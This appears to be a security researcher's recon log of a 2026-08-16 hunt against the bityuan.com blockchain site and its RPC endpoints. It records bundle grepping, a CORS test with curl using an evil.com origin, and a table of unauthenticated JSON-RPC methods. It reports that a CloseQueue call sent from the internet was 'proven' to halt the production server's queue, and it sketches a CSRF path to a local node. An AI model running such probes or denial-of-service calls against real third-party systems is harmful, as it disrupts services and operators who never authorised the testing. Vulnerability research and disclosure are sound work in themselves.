# Bityuan Web2 + Open RPC Hunt — 2026-08-16

## Target
`https://bityuan.com` (Vue SPA) + `https://mainnet.bityuan.com` (block explorer + eth RPC) + `https://bityuan.com/rpc` (chain33 JRPC)

## SPA Decoy
- `bityuan.com` = `nginx/1.22.1`, `index.html 1366 bytes` + `assets/index.5f162ebe.js 1.38MB` (Vue, Vite).
- `_next` scan via `web2-deep.py v3` flagged 6 🔥 (`/.env`, `/admin/api/login`, `/api/health`, `/graphql`, `/openapi.json`, `/swagger`) — ALL `200 text/html <!DOCTYPE>` SPA fallback. Rule: `200 + <!DOCTYPE` = decoy, not endpoint.
- Real APIs must return `Content-Type: application/json` + `{"id":...}`.

## JS Bundle Extraction (`/tmp/bityuan.js` 1.38MB)
```
grep https:// -> 
  Wm="https://bityuan.com/api"  -> /twiMetamask/login|callback|teleCallback|info
  Ec="/rpc"  X1e="/ethServer"
  rpcMap:{2999:"https://mainnet.bityuan.com/eth"}
  https://dns.bityuan.com/  https://taste.bityuan.com/
  wss://relay.walletconnect.com, https://gateway.ipfs.io/ipfs/${t}
grep path ->  /:catchAll(.*) /activity /community /developers /node /oauth /pool /quest-detail /sendTransaction /test
auth ->  $r() { headers:{"x-token":localStorage.getItem("bityuan_token")} }  // localStorage, not cookie
oauth chunk ->  missing (fallback), only router entry /oauth
```
- No Firebase/Supabase hardcoded secrets. No `password/apiKey` leak beyond generic lodash `projectId`.

## Real API Validation
| Endpoint | Method | Response | Verdict |
|---|---|---|---|
| `POST https://bityuan.com/rpc {"method":"Chain33.Version"}` | POST JSON | `{"title":"bityuan","app":"6.8.21","chain33":"1.68.2"}` 200 | **LIVE** |
| `POST https://bityuan.com/rpc {"method":"Chain33.GetWalletStatus"}` | POST JSON | `{"isWalletLock":true,"isHasSeed":true}` 200 | **LIVE** |
| `POST https://mainnet.bityuan.com/eth {"method":"eth_chainId"}` | POST JSON | `{"result":"0xbb7"}` 200 | **LIVE** |
| `POST https://mainnet.bityuan.com/eth {"method":"net_version"}` | POST JSON | `2999` 200 | **LIVE** |
| `GET https://bityuan.com/api/twiMetamask/info` | GET | `{"code":7,"msg":"未登录或非法访问"}` 404 JSON | auth-gated |
| `GET https://bityuan.com/.env` etc | GET | `<!DOCTYPE html>` 200 | SPA fallback |

## CORS * Check
```
curl -H Origin:http://evil.com -H Content-Type:application/json -d '{"method":"Chain33.Version"}' https://bityuan.com/rpc -i
-> access-control-allow-origin: * , vary: Origin , 200 JSON
```
Both JRPC and explorer allow `*` — any `evil.com` can read response (not blind).

## Whitelist Map (External, No Auth — Third-Party)
Probed from internet (attacker = external, victim = bityuan.com server):

| Method | Result | Meaning |
|---|---|---|
| `Version` | 200 | info leak |
| `GetBlocks {"start":0,"end":1}` | 200 genesis 1HT7... | info leak |
| `GetWalletStatus` | 200 `isWalletLock:true` | info leak |
| `GetMempool` | 200 | info leak |
| `GetPeerInfo` | 200 `116.62.172.54:13803` | peer leak |
| `CreateRawTransaction` | 200 hex `0x0a05...` | spam tx |
| `CloseQueue` | 200 `{"isOk":true}` | **PROVEN external DoS — victim is server, not self** |
| `GetAccounts` | 403 `method is not authorized!` | blocked |
| `GetSeed` | 403 | blocked |
| `DumpPrivkey` | 403 | blocked |
| `UnLock` | 403 | blocked |

## Third-Party vs Self-Harm Triage (User Rule 2026-08-16)
User: `berarti weakness harus menyebabkan orang ketiga kan? gaada di dalem tubuh itu sendiri?`

- **Self-harm (reject):** `curl 127.0.0.1:8801 CloseQueue` on own node, `JS while(true)` on own contract — attacker = victim.
- **Third-party (claim):** `curl https://bityuan.com/rpc CloseQueue` from internet → server's queue halts (external DoS); `fetch evil.com -> 127.0.0.1:8801` CSRF where victim is browser operator; `mainnet.bityuan.com/eth` info leak.
- Prior CDC chain `CORS * + loopback bypass` was CSRF (needs victim visit) — now `bityuan.com/rpc CloseQueue` is direct external without CSRF → stronger third-party proof.

## Subdomains
- `docs.bityuan.com` 200 GitHub Pages VuePress + `access-control-allow-origin: *`
- `testnet.bityuan.com` 200 explorer `nginx/1.24.0`
- `dns.bityuan.com` 200 Blockchain DNS `nginx/1.14.0`
- `www.bityuan.com` 301 → bityuan.com
- No `api/admin/rpc` subdomains (brute 10 = 000)

## Provenance
- Logs: `curl -I` + `curl -s -X POST` with `Mozilla/5.0` UA (low-noise, single-req).
- Files: `/tmp/bityuan.js` (1.38MB), `/tmp/deep-hunt-e151c78e/` (chunks 1.3M).
- Date: 2026-08-16, tool: `web2-deep.py v3` + manual JS grep (python `re`).
